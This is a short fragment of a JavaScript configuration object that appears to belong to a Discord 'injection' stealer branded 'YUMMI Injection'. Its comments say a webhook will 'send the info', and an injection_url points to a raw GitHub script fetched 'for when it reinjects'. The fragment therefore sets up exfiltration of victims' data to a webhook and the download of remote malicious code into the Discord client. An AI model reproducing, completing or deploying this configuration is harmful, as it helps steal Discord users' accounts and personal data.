...
const config = {
  ...
  embed_name: 'YUMMI Injection', //name of the webhook thats gonna send the info
  embed_icon: 'https://media.discordapp.net/attachments/1089275224370991115/1093578170751537211/a_312b146bbdfe1064df6c71837cf26e44.gif?size=4096'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
  ...
  injection_url: 'https://raw.githubusercontent.com/KiriiFvk/ignore-injection/main/injection.js', //injection url for when it reinjects
  /**
